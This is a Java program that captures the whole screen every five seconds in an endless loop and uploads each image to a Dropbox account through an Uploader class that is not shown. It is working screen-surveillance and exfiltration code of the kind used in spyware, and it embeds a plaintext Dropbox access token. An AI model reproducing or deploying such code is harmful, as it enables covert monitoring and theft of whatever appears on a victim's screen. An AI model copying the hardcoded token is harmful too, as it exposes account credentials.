package com.company;
import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
public class Main {
    public static void main(String[] args) throws IOException, DbxException, AWTException {
        String ACCESS_TOKEN = "sl.AyXbx_isMPvWWqRPf2-BMqQsqUjFw_w0NozuDm3qJOEgOGIRO2jcM3t5yl6bbCdUzLhDowQ39ifJtIrs2knMf2GjMArsQIUPafGUl2yw51bGhd0g2Kv2UwFC1ga3CyB5nMfsQEs";

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        for(;;){
            Robot r = new Robot();
            BufferedImage image = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

            ;
            Uploader uploader = new Uploader(client, image);
            uploader.run();
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }
        }
    }


